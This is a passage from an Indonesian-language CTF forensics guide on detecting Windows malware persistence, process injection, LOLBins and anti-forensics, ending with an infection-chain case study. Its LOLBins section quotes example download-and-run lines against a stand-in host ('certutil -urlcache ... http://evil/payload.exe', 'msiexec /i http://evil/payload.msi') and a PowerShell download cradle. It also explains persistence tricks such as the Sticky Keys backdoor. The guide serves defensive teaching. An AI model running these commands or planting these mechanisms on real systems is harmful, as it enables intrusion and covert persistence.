**CLSID yang sering jadi target** karena dipanggil otomatis saat proses umum berjalan: CLSID milik `MMC` (Microsoft Management Console, T1546.015 klasik), shell extension yang dipanggil `explorer.exe` saat startup, dan CLSID terkait `ShellIconOverlayIdentifiers`. Kalau soal menyebut "proses X yang bukan bagian dari sistem tiba-tiba jalan setiap kali Explorer/MMC dibuka", COM hijacking adalah kandidat pertama untuk dicek.

#### 8.9.5 AppInit_DLLs, AppCertDLLs & DLL Search Order Hijacking

```
SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\
├── AppInit_DLLs      ← DLL di-load ke SETIAP proses yang load user32.dll
└── LoadAppInit_DLLs  ← harus =1 supaya AppInit_DLLs aktif

SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\
└── AppCertDLLs       ← DLL di-load setiap kali CreateProcess dipanggil
```

**DLL Search Order Hijacking** (bukan registry-based): taruh DLL malware dengan nama sama seperti DLL sistem legit di folder yang di-scan lebih dulu oleh Windows (biasanya folder aplikasi itu sendiri, karena Windows mencari DLL di folder aplikasi *sebelum* System32).

**Urutan pencarian DLL standar Windows** (tanpa `SafeDllSearchMode` dimatikan) — ini yang dieksploitasi attacker dengan menaruh DLL palsu di urutan paling awal:

```
1. Folder tempat .exe aplikasi berada        ← target favorit attacker
2. Folder sistem (C:\Windows\System32)
3. Folder sistem 16-bit (jarang relevan)
4. Folder Windows (C:\Windows)
5. Current working directory (CWD)
6. Folder-folder di environment variable PATH
```

**Phantom DLL Hijacking** — varian di mana aplikasi legit mencoba `LoadLibrary()` sebuah DLL yang **memang tidak ada** secara default di sistem (misal DLL opsional/plugin yang jarang dipakai, atau DLL dari versi Windows lama yang sudah tidak ada di versi baru). Attacker cukup menaruh DLL malware dengan nama persis di salah satu folder pencarian — tidak perlu "menggantikan" apapun karena slot-nya memang kosong, sehingga lebih sulit terdeteksi dibanding hijack DLL yang benar-benar dipakai.

> 💡 **Tip CTF:** Kalau soal menyebut "aplikasi legit X ternyata me-load DLL berbahaya", cek dulu **lokasi** DLL yang di-load (sama folder dengan .exe = kemungkinan search order hijacking) sebelum curiga ke AppInit_DLLs/AppCertDLLs (yang sifatnya sistem-wide, bukan spesifik satu aplikasi). Untuk konfirmasi via memory/live: `ldrmodules` (Bab 7 §7.7.2) atau Process Explorer DLL view — cek apakah DLL yang ter-load berasal dari path yang **tidak seharusnya** (folder aplikasi/Temp, bukan System32) untuk nama DLL yang normalnya sistem.

#### 8.9.6 Service DLL Hijacking

Banyak Windows service dijalankan via `svchost.exe -k <group>` dengan DLL aktual didefinisikan di:

```
SYSTEM\ControlSet001\Services\<NamaService>\Parameters\
└── ServiceDll   ← path DLL yang benar-benar dieksekusi svchost untuk service ini
```

Attacker mengganti value `ServiceDll` menunjuk ke DLL malware — service tetap terlihat "normal" (nama & display name asli) di Service Control Manager, tapi payload yang jalan sudah berbeda.

#### 8.9.7 BITS Jobs

Background Intelligent Transfer Service — dirancang untuk download/upload file secara resilient (bertahan lewat reboot, throttled), sering disalahgunakan untuk download payload stage-2 secara "senyap" karena traffic-nya terlihat seperti Windows Update biasa.

```bash
# Enumerasi BITS job aktif/pending di live system
bitsadmin /list /allusers /verbose

# Live system: PowerShell
Get-BitsTransfer -AllUsers
```

#### 8.9.8 LSA Security Package Persistence

```
SYSTEM\ControlSet001\Control\Lsa\
├── Security Packages     ← daftar DLL security package yang di-load LSASS
└── Authentication Packages
```

Menambahkan DLL malware ke list ini membuatnya ter-load ke dalam proses `lsass.exe` setiap boot — teknik persistence lanjutan yang juga memberi akses ke memory kredensial (kombinasi persistence + credential theft).

> ⚠️ **Risiko tinggi kalau salah tangani:** Karena berjalan di dalam LSASS, modifikasi/investigasi live di sini butuh kehati-hatian ekstra (crash LSASS = sistem restart paksa). Untuk analisis, selalu kerja dari **image/hive mati**, bukan live system produksi.

#### 8.9.9 Browser & Office-Based Persistence

**Browser extension** adalah salah satu vektor persistence yang paling sering diremehkan — bertahan lintas sesi tanpa menyentuh registry Windows sama sekali, dan sering lolos dari checklist persistence yang cuma fokus ke Run key/Services.

```
# Chrome/Edge (Chromium-based) — path per-profile
%LOCALAPPDATA%\Google\Chrome\User Data\<Profile>\Extensions\<ExtensionID>\<Version>\
%LOCALAPPDATA%\Microsoft\Edge\User Data\<Profile>\Extensions\<ExtensionID>\<Version>\

# Firefox
%APPDATA%\Mozilla\Firefox\Profiles\<profile>.default\extensions\<ExtensionID>.xpi
```

**Cara instalasi extension mencurigakan** yang perlu dibedakan:

| Metode Instalasi | Indikator | Tingkat Kecurigaan |
|---|---|---|
| Chrome Web Store normal | Extension ID terdaftar, ada di `Preferences` JSON dengan `install_time` normal | Rendah |
| **Developer mode / unpacked** | Extension di-load dari folder lokal (bukan dari store), muncul di `chrome://extensions` dengan tag "Unpacked" | **Tinggi** — teknik umum malware, bypass review store |
| **Force-install via Group Policy/Registry** | `HKLM\...\Chrome\ExtensionInstallForcelist` berisi ID + URL update | **Tinggi** — attacker dengan akses admin memaksa install tanpa interaksi user, extension tidak bisa di-uninstall manual oleh user |
| Sideload via installer pihak ketiga | Entry muncul tiba-tiba tanpa aktivitas user di riwayat Chrome Web Store | Sedang-Tinggi |

```bash
# Baca metadata & permission extension
type "<path>\Extensions\<ExtensionID>\<Version>\manifest.json"
# Field kunci: "permissions" (mis. "tabs", "webRequest", "cookies", "<all_urls>" = akses semua situs)

# Cek force-install policy (indikasi persistence level admin)
reg query "HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist"

# File Preferences/Secure Preferences per-profile berisi install_time & from_webstore (true/false)
type "<Profile>\Secure Preferences"
```

> 💡 **Tip CTF:** Kalau `manifest.json` punya `"permissions": ["<all_urls>", "webRequest", "cookies"]`, itu extension bisa membaca/memodifikasi **semua traffic HTTP dan cookie situs manapun** — pola khas extension untuk credential/session hijacking, bukan sekadar adware. Cek juga `background.js`/`content_script.js` di dalam folder extension untuk logic sebenarnya (sering di-obfuscate, perlakukan seperti string extraction biasa — §8.4).

**Office Add-in & Startup Persistence:**

* **Office Add-in** (`.wll`/`.xll` untuk Excel, template `Normal.dotm` untuk Word) — di-load otomatis tiap aplikasi Office dibuka.
* **Startup folder Office**: `%APPDATA%\Microsoft\Excel\XLSTART\` — file apapun di sini dibuka otomatis saat Excel start.
* **VBA Macro di Normal.dotm/Personal.xlsb** — macro yang disisipkan ke template default, bukan ke satu dokumen spesifik, sehingga jalan otomatis di **setiap** dokumen baru yang dibuka user, bukan cuma dokumen yang awalnya terinfeksi.

#### 8.9.10 Application Shimming (Custom Shim Database)

> ⚠️ **Jangan tertukar dengan ShimCache/AppCompatCache** (**Bab 3 §3.8**) — ShimCache itu artefak *evidence of execution* (pasif, cuma mencatat), sedangkan **Application Shimming** di sini adalah mekanisme *aktif* Windows Application Compatibility untuk "menambal" perilaku aplikasi lama, yang bisa **disalahgunakan sebagai persistence** (T1546.011).

Windows Application Compatibility Framework mengizinkan pembuatan **custom shim database** (`.sdb`) yang di-install via `sdbinst.exe`. Shim ini di-attach ke sebuah executable target, dan setiap kali executable itu dijalankan, Windows Compatibility Engine (`apphelp.dll`) meng-inject logic shim **sebelum** kode asli aplikasi jalan — attacker memanfaatkan ini untuk inject payload (mis. shim `InjectDll` yang memaksa proses target me-load DLL malware) tanpa mengubah file executable aslinya sama sekali.

```
SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB\  ← daftar shim database ter-install
SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom\<Nama.exe>  ← binding shim ke executable

C:\Windows\AppPatch\Custom\               ← lokasi file .sdb custom (bukan bawaan Microsoft)
C:\Windows\AppPatch\Custom\Custom64\      ← versi 64-bit
```

```bash
# Install shim database (ini yang dijalankan attacker/dicari di command history)
sdbinst.exe malicious.sdb

# Enumerasi shim ter-install di live system
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\InstalledSDB"

# Parsing isi .sdb offline (format proprietary Microsoft) — python-sdb atau strings dasar
python3 -m sdb malicious.sdb
strings malicious.sdb | grep -i "InjectDll\|RedirectEXE\|CorrectFilePaths"
```

> 💡 **Tip CTF:** File `.sdb` custom (bukan bawaan Windows) di folder `AppPatch\Custom\` yang **tidak dibuat oleh vendor software resmi** adalah red flag langsung. Shim database legit biasanya dibuat vendor untuk kompatibilitas software lama (game/aplikasi enterprise) — kalau nama `.sdb` tidak match software apapun yang ter-install, atau `sdbinst.exe` muncul di EVTX 4688 dijalankan dari path mencurigakan (`Temp`, `AppData`), curigai sebagai persistence.

---

#### 8.9.11 Teknik Persistence Niche Lainnya

Teknik-teknik berikut lebih jarang muncul dibanding Run key/Services/Scheduled Task, tapi tetap masuk radar CTF forensic modern dan MITRE ATT&CK — cukup dikenali polanya, tidak perlu dihafal detail mendalam.

| Teknik | MITRE ATT&CK | Lokasi Artefak | Cara Kerja Singkat |
|---|---|---|---|
| **Time Providers** | T1547.003 | `SYSTEM\...\W32Time\TimeProviders\<Nama>` | DLL didaftarkan sebagai time provider Windows Time Service, di-load oleh `svchost.exe` tiap boot |
| **Netsh Helper DLL** | T1546.007 | `SOFTWARE\Microsoft\Netsh\<Nama>` | DLL didaftarkan sebagai helper `netsh.exe`, ter-load setiap `netsh` command dijalankan siapapun |
| **Port Monitor** | T1547.010 | `SYSTEM\...\Control\Print\Monitors\<Nama>\Driver` | DLL didaftarkan sebagai print port monitor, di-load oleh `spoolsv.exe` (proses SYSTEM) tiap boot — sering dipakai untuk privilege escalation sekaligus persistence |
| **Print Processor** | T1547.012 | `SYSTEM\...\Control\Print\Environments\...\Print Processors\<Nama>` | Mirip Port Monitor — DLL di-load `spoolsv.exe`, butuh privilege admin untuk daftar tapi jalan sebagai SYSTEM |
| **Accessibility Features (Sticky Keys backdoor)** | T1546.008 | `HKLM\...\Image File Execution Options\sethc.exe\Debugger` | Teknik klasik: replace `sethc.exe` (Sticky Keys, dipanggil 5x tekan Shift di *login screen*) dengan `cmd.exe`, atau pasang IFEO Debugger (§Bab 3 §3.4.4) supaya `sethc.exe` memanggil `cmd.exe` — command prompt SYSTEM tanpa login |
| **Screensaver** | T1546.002 | `HKCU\Control Panel\Desktop\SCRNSAVE.EXE` | Path executable screensaver diarahkan ke payload malware, jalan otomatis setelah idle timeout |
| **PowerShell Profile** | T1546.013 | `$PROFILE` — `Documents\WindowsPowerShell\profile.ps1` | Script dieksekusi otomatis **setiap kali** PowerShell dibuka (interaktif) — persistence "menunggu" analis/admin membuka PowerShell |

> 💡 **Tip CTF:** **Sticky Keys backdoor** khusus perlu diperhatikan di skenario RDP/remote access — kalau soal menunjukkan attacker punya akses SYSTEM tanpa kredensial valid yang tercatat login normal, cek dulu `HKLM\...\Image File Execution Options\sethc.exe` (atau `utilman.exe`/`osk.exe` — target IFEO lain yang sama-sama accessible dari login screen) sebelum curiga ke exploit privilege escalation yang lebih kompleks.

---

#### 8.9.12 Autoruns — Enumerasi Persistence All-in-One

Untuk kasus **live system** atau **mounted disk image**, [Sysinternals Autoruns](https://learn.microsoft.com/sysinternals/downloads/autoruns) (GUI: `Autoruns.exe`, CLI: `autorunsc.exe`) mengecek **puluhan lokasi persistence sekaligus** (Run key, Services, Scheduled Task, WMI, COM, AppInit, Winlogon, Browser Helper Object, dan sebagian besar teknik di §8.9-8.10) dalam satu scan — jauh lebih cepat dibanding cek manual satu-satu saat waktu CTF terbatas.

```bash
# CLI, output CSV, scan semua kategori, verifikasi signature (skip yang signed Microsoft)
autorunsc.exe -a * -c -h -s -o output.csv

# Scan terhadap OFFLINE disk image yang di-mount (bukan live system yang sedang dijalankan)
autorunsc.exe -a * -c -z "C:\MountedImage" "C:\MountedImage\Users\<User>"
```

> ⚠️ **Batasan penting:** Autoruns **tidak** mencakup semua teknik di §8.9 — WMI Event Subscription ter-cover, tapi Application Shimming (§8.9.10), Netsh Helper (§8.9.11), dan beberapa teknik niche lainnya **tidak selalu** muncul di hasil scan Autoruns tergantung versi tool. Gunakan Autoruns sebagai **langkah triase cepat** untuk menyingkirkan teknik-teknik umum, bukan sebagai satu-satunya sumber kebenaran — tetap validasi manual untuk teknik yang lebih niche.

> 💡 **Tip CTF:** Kolom "Publisher" dan checkbox "Hide Microsoft Entries" di GUI Autoruns adalah filter tercepat — sembunyikan dulu semua entry yang signed & verified Microsoft, sisanya (unsigned, signed pihak ketiga tidak dikenal, atau publisher kosong) adalah kandidat prioritas untuk diperiksa lebih lanjut.

---

### 8.10 Tabel Master Persistence (MITRE ATT&CK Mapping)

Tabel gabungan **seluruh** teknik persistence yang muncul di seri ini (Bab 3 + Bab 8) — satu rujukan tunggal supaya tidak perlu bolak-balik bab.

| Teknik | MITRE ATT&CK | Lokasi Artefak | Dibahas Di |
|---|---|---|---|
| Run / RunOnce Key | T1547.001 | `SOFTWARE\...\Run` (HKLM/HKCU) | Bab 3 §3.4.2 |
| Services | T1543.003 | `SYSTEM\...\Services\<Nama>` | Bab 3 §3.3.2 |
| IFEO Debugger Hijack | T1546.012 | `...\Image File Execution Options` | Bab 3 §3.4.4 |
| Winlogon Shell/Userinit Hijack | T1547.004 | `...\Winlogon\Shell` / `Userinit` | Bab 3 §3.4.4 |
| Browser Helper Object (BHO) | T1176 | `...\Browser Helper Objects` | Bab 3 §3.4.4 |
| Scheduled Task | T1053.005 | EVTX 4698-4702 + `System32\Tasks\*` | Bab 4 §4.3.9, Bab 8 §8.9.1 |
| Startup Folder | T1547.001 | `...\Start Menu\Programs\Startup\` | Bab 8 §8.9.2 |
| WMI Event Subscription | T1546.003 | `root\subscription` / `OBJECTS.DATA` | Bab 8 §8.9.3 |
| COM Hijacking | T1546.015 | `HKCU\...\CLSID\<CLSID>\InprocServer32` | Bab 8 §8.9.4 |
| AppInit_DLLs | T1546.010 | `...\Windows\AppInit_DLLs` | Bab 8 §8.9.5 |
| DLL Search Order Hijacking | T1574.001 | DLL di folder aplikasi, nama menyerupai DLL sistem | Bab 8 §8.9.5 |
| Service DLL Hijacking | T1543.003 | `...\Services\<Nama>\Parameters\ServiceDll` | Bab 8 §8.9.6 |
| BITS Jobs | T1197 | `bitsadmin` / `Get-BitsTransfer` | Bab 8 §8.9.7 |
| LSA Security Package | T1547.005 | `...\Control\Lsa\Security Packages` | Bab 8 §8.9.8 |
| Browser Extension | T1176 | Profil browser `Extensions\` | Bab 6 §6.7.3, Bab 8 §8.9.9 |
| Office Add-in / Startup | T1137 | `%APPDATA%\Microsoft\Excel\XLSTART\`, dst | Bab 8 §8.9.9 |
| Application Shimming | T1546.011 | `...\AppCompatFlags\Custom\<Nama.exe>`, `AppPatch\Custom\*.sdb` | Bab 8 §8.9.10 |
| Time Providers | T1547.003 | `SYSTEM\...\W32Time\TimeProviders\<Nama>` | Bab 8 §8.9.11 |
| Netsh Helper DLL | T1546.007 | `SOFTWARE\Microsoft\Netsh\<Nama>` | Bab 8 §8.9.11 |
| Port Monitor | T1547.010 | `SYSTEM\...\Control\Print\Monitors\<Nama>\Driver` | Bab 8 §8.9.11 |
| Print Processor | T1547.012 | `SYSTEM\...\Print Processors\<Nama>` | Bab 8 §8.9.11 |
| Accessibility Features (Sticky Keys) | T1546.008 | `...\IFEO\sethc.exe\Debugger` (& utilman/osk) | Bab 8 §8.9.11 |
| Screensaver | T1546.002 | `HKCU\Control Panel\Desktop\SCRNSAVE.EXE` | Bab 8 §8.9.11 |
| PowerShell Profile | T1546.013 | `Documents\WindowsPowerShell\profile.ps1` | Bab 8 §8.9.11 |

> 💡 **Cara pakai tabel ini:** Kalau soal cuma bilang "attacker memasang persistence, temukan mekanismenya" tanpa petunjuk lebih lanjut, jalankan semua baris di atas sebagai **checklist** — mulai dari yang paling umum (Run key, Services) baru ke yang lebih canggih (WMI, COM hijacking) kalau checklist awal nihil.

---

### 8.11 Process Injection & Evasion

#### 8.11.1 DLL Injection, Process Hollowing, Process Doppelgänging

| Teknik | Konsep Singkat |
|---|---|
| **DLL Injection** | Paksa proses lain me-load DLL malware (`CreateRemoteThread` + `LoadLibrary`, atau `SetWindowsHookEx`) |
| **Process Hollowing** | Buat proses legit dalam keadaan suspended, "kosongkan" memory image aslinya, ganti dengan payload malware, lalu resume |
| **Process Doppelgänging** | Manfaatkan mekanisme NTFS Transaction untuk load payload dari file yang "tidak pernah benar-benar commit" ke disk, menyamarkan proses hasil injection |

#### 8.11.2 Korelasi Deteksi ke Bab 7

Ketiga teknik di atas adalah sisi **perilaku malware**; sisi **deteksinya dari memory image** sudah dibahas tuntas di Bab 7:

* `malfind` — cari region memory dengan permission mencurigakan (RWX) tanpa backing file yang wajar (**§7.7.1**)
* `ldrmodules` — bandingkan DLL yang tercatat loader vs yang benar-benar termapping di memory, ketidakcocokan = indikasi unlinked/hollowed module (**§7.7.2**)
* `hollowfind` + perbandingan VAD vs disk image — deteksi spesifik process hollowing (**§7.7.3**)

> 💡 **Prinsip pembagian:** Bab 8 menjelaskan **bagaimana** teknik ini bekerja dari sudut pandang malware; Bab 7 menjelaskan **bagaimana mendeteksinya** dari RAM dump. Keduanya saling melengkapi, bukan duplikat.

#### 8.11.3 LOLBins (Living-off-the-Land Binaries)

Attacker memakai binary **bawaan Windows yang legitimate** untuk menjalankan aksi berbahaya, menghindari deteksi berbasis "executable asing".

| LOLBin | Penyalahgunaan Umum |
|---|---|
| `rundll32.exe` | Eksekusi DLL malware / fungsi export tersembunyi |
| `regsvr32.exe` | "Squiblydoo" — download & eksekusi script COM scriptlet remote |
| `mshta.exe` | Eksekusi HTA berisi VBScript/JScript (§8.5.3) |
| `certutil.exe` | Download file (`-urlcache -split -f`) atau decode base64 payload |
| `powershell.exe` | Encoded command, download cradle (`IEX (New-Object Net.WebClient).DownloadString(...)`) |
| `wmic.exe` | Eksekusi proses remote, enumerasi/evasion |
| `msiexec.exe` | Install/eksekusi payload dari `.msi` remote (`msiexec /i http://evil/payload.msi`) |
| `installutil.exe` / `regasm.exe` / `regsvcs.exe` | Bypass AppLocker/Application Control — eksekusi kode via .NET assembly method khusus (`InstallHelper`/COM registration) tanpa memicu deteksi "executable asing" |
| `cmstp.exe` | Eksekusi scriptlet remote via `.inf` file berisi konfigurasi Connection Manager palsu — bypass UAC sekaligus eksekusi |
| `msbuild.exe` | Eksekusi C# inline di dalam file project `.xml`/`.csproj` — payload disamarkan sebagai "build task", tidak terlihat seperti executable sama sekali |
| `bitsadmin.exe` | Download payload via BITS job (§8.9.7) — traffic menyerupai Windows Update |

> 💡 **Tip CTF:** Command line lengkap LOLBin (bukan cuma nama proses) adalah kunci — `certutil.exe` normal vs `certutil.exe -urlcache -split -f http://evil/payload.exe` terlihat sama-sama "certutil.exe" di process list, bedanya cuma di argumen. Selalu cek EVTX 4688/Sysmon 1 untuk **command line lengkap** (**Bab 4 §4.3.4**), jangan cuma nama image.

> 📖 **Referensi lengkap:** Tabel di atas cuma sebagian kecil — database lengkap & selalu ter-update ada di [LOLBAS Project](https://lolbas-project.github.io/) (Living Off The Land Binaries, Scripts and Libraries), mencakup command spesifik per-binary untuk download, execute, bypass, dan credential access. Kalau menemukan nama binary Windows asing yang jalan dengan argumen mencurigakan di CTF, cek nama binary tersebut di LOLBAS sebelum menyimpulkan "tidak dikenal".

---

### 8.12 Anti-Analysis & Anti-Forensic oleh Malware

#### 8.12.1 VM/Sandbox Detection Tricks

Malware sering cek indikator lingkungan virtual sebelum menjalankan payload sesungguhnya, supaya tidak "terbongkar" saat dianalisa:

* Registry key VM (`HARDWARE\Description\System\SystemBiosVersion` mengandung "VBOX"/"VMware")
* Nama proses tools analisis (`vboxservice.exe`, `vmtoolsd.exe`, `wireshark.exe`) sedang berjalan
* Ukuran RAM/disk sangat kecil (khas VM analisis minimal)
* Delay/sleep panjang sebelum eksekusi payload — sandbox otomatis biasanya punya timeout analisis terbatas

> 💡 **Implikasi analisis:** Kalau sampel "tidak menunjukkan perilaku mencurigakan apapun" di dynamic analysis, jangan langsung simpulkan aman — cek dulu apakah ada indikasi anti-VM check di static analysis (import `IsDebuggerPresent`, string terkait "VBOX"/"VMware" — §8.4).

#### 8.12.2 Timestomping & Log Clearing

Malware/attacker sering menutup jejak dengan dua teknik yang **sudah dibahas detail** di bab lain:

* **Timestomping** file hasil drop — teknik & deteksi SI vs FN mismatch sudah dibahas lengkap di **Bab 2 §2.1.3**.
* **Log cleared** (Event ID 1102) atau service EVTX dimatikan — sudah dibahas di **Bab 4 §4.9 (Anti-Forensic: Log Dihapus/Dimatikan)**.

> 📖 Tidak diulang di sini — kalau soal CTF menunjukkan gejala salah satu di atas, langsung rujuk ke bagian terkait untuk detail teknik deteksinya.

#### 8.12.3 Fileless Malware

Malware yang tidak (atau minimal) menyentuh disk sebagai file executable — payload di-load & dieksekusi langsung di memory (lewat PowerShell reflection, WMI §8.9.3, atau registry-stored payload yang di-load loader kecil).

> ⚠️ **Konsekuensi untuk investigasi:** Artefak "evidence of execution" klasik (Prefetch, Amcache, ShimCache — Bab 3-4) bisa jadi **tidak mencatat apapun** karena tidak ada file baru yang benar-benar dieksekusi sebagai proses independen. Untuk kasus begini, **memory forensics (Bab 7)** dan **EVTX PowerShell Script Block Logging (Bab 4 §4.5.3)** jadi sumber bukti utama, bukan artefak disk biasa.

---

### 8.13 Tabel Korelasi Cepat — Indikator Malware

| Pertanyaan | Cek Di Mana | Bagian |
|---|---|---|
| Apakah file ini packed? | Entropy section, import table pendek | §8.2.2, §8.2.3 |
| Apa keluarga malware-nya? | Imphash, YARA match, VirusTotal | §8.3.1-8.3.3 |
| Apa C2 domain/IP-nya? | FLOSS strings, config decode, DNS artifact | §8.4, §8.8.1-8.8.2 |
| Bagaimana ia bertahan reboot? | Tabel master persistence | §8.10 |
| Bagaimana ia masuk pertama kali? | LNK/Jump List, browser download history, USB | §5.3-5.4, §6.2.5, §3.3.3 |
| Apakah ada process injection? | malfind, ldrmodules (memory) | §7.7.1-7.7.2, §8.11 |
| Apakah attacker pakai LOLBin? | Command line lengkap di EVTX 4688/Sysmon 1 | §8.11.3, §4.3.4 |
| Apakah jejak dihapus/dipalsukan? | Timestomping, log cleared, VSS dihapus | §2.1.3, §4.9, §5.1.8 |
| Fileless — kenapa Prefetch/Amcache kosong? | Cek memory + PowerShell Script Block Log | §8.12.3, §7.x, §4.5.3 |
| Script apa yang jadi dropper? | Marker AutoIt3/PowerShell EncodedCommand/HTA | §8.5.3 |
| Persistence tidak ada di registry umum/Task, di mana lagi? | Application Shimming, browser extension, atau checklist niche | §8.9.9-8.9.11 |
| Ingin scan semua kemungkinan persistence sekaligus? | Autoruns sebagai langkah triase awal | §8.9.12 |

---

### 8.14 Ringkasan Command & Tools Cheat Sheet

| Kebutuhan | Tool | Command Contoh |
|---|---|---|
| Inspeksi PE header | `pefile` (Python) | `python3 -c "import pefile; pefile.PE('s.exe')"` |
| Deteksi packer | Detect It Easy | `diec sample.exe` |
| Unpack UPX | `upx` | `upx -d sample.exe -o out.exe` |
| Hash + imphash | `sha256sum` / `pefile` | `sha256sum sample.exe` |
| Fuzzy hash | `ssdeep` | `ssdeep -m known.txt sample.exe` |
| Scan signature | YARA | `yara -r rules.yar sample.exe` |
| String deobfuscation | FLOSS | `floss sample.exe` |
| Decompile AutoIt3 | Exe2Aut | `Exe2Aut.exe sample.exe` |
| Behavioral monitoring | ProcMon | GUI, filter by process name |
| Network sandbox lokal | FakeNet-NG / INetSim | `fakenet.exe` / `inetsim` |
| WMI persistence check | PyWMIPersistenceFinder | `python3 PyWMIPersistenceFinder.py OBJECTS.DATA` |
| BITS job enumeration | `bitsadmin` | `bitsadmin /list /allusers /verbose` |
| Scheduled task at-rest | manual read | `type "System32\Tasks\<Nama>"` |
| Enumerasi persistence all-in-one | Autoruns (Sysinternals) | `autorunsc.exe -a * -c -h -s -o output.csv` |
| COM hijack check (offline hive) | RegRipper `comhijack` plugin | `rip.pl -r NTUSER.DAT -p comhijack` |
| Shim database parsing | python-sdb | `python3 -m sdb malicious.sdb` |
| Browser extension manifest | manual read JSON | `type "Extensions\<ID>\<Ver>\manifest.json"` |



---

### 8.15 Mini Case Study — Rekonstruksi Infection Chain AutoIt3-based

Alur berpikir untuk soal bertema *"seorang user menjalankan installer palsu, sistem akhirnya terinfeksi dan berkomunikasi keluar — rekonstruksi infection chain lengkapnya"* (pola umum di HTB Sherlock seperti CAMouflage/Sharelock):

```
Langkah 1 — Cari titik masuk (delivery)
   └── Browser download history (6.2.5) / LNK di folder Downloads (5.3)
       → dapat nama file installer & waktu download

Langkah 2 — Verifikasi installer "palsu"
   └── Static analysis: PE header (8.2.1), signature/certificate check
       → installer legit biasanya signed; installer palsu sering unsigned/self-signed

Langkah 3 — Identifikasi dropper di dalamnya
   └── Extract resource (8.2.4) atau overlay data — sering berisi payload AutoIt3 compiled
       → Exe2Aut untuk decompile jadi source .au3 (8.5.3), baca logic dropper-nya

Langkah 4 — Konfirmasi eksekusi dropper di sistem korban
   └── Prefetch + Amcache (Bab 3-4) → cocokkan hash/nama file dengan installer di Langkah 1
   └── EVTX 4688 / Sysmon 1 → command line lengkap saat dropper dijalankan

Langkah 5 — Cari payload stage-2 yang di-drop
   └── $MFT/UsnJrnl (Bab 2) untuk file baru yang dibuat tepat setelah dropper jalan
   └── Sysmon Event 11 (FileCreate) untuk konfirmasi timeline presisi

Langkah 6 — Identifikasi mekanisme persistence
   └── Cek tabel master (8.10) mulai dari Run key/Services (Bab 3),
       lanjut ke Scheduled Task at-rest (8.9.1) kalau nihil di registry

Langkah 7 — Ekstrak C2 dari payload final
   └── FLOSS + YARA (8.3.3, 8.4.1) pada payload stage-2
       → dapat domain/IP hardcoded, atau endpoint layanan legit (Discord/Telegram — 8.8.4)

Langkah 8 — Konfirmasi C2 aktif dari sisi network/host
   └── Sysmon Event 3 (Network Connection) + Event 22 (DNS Query) — Bab 4 §4.6.2, §4.6.7
       → cocokkan waktu koneksi dengan waktu payload stage-2 mulai berjalan (Langkah 5)

Kesimpulan yang bisa ditulis di laporan:
"User mengunduh installer palsu bernama X pada waktu Y (browser history). Installer ini
membungkus dropper AutoIt3 yang, setelah di-decompile, menunjukkan logic untuk men-drop
payload stage-2 ke %AppData%\Local\Temp.Payload stage-2 memasang persistence via
Scheduled Task bernama Z, lalu melakukan koneksi keluar ke domain C2 hardcoded W
(dikonfirmasi via Sysmon Event 3 & 22 pada waktu yang bersesuaian dengan eksekusi payload)."
```

> 💡 **Prinsip umum:** Infection chain yang meyakinkan tidak berhenti di "menemukan malware-nya" — harus bisa menjawab **delivery → eksekusi → persistence → C2** sebagai satu rangkaian waktu yang saling terhubung, bukan empat temuan terpisah. Ini kombinasi metodologi dari seluruh Bab 1-8, bukan cuma satu artefak tunggal.
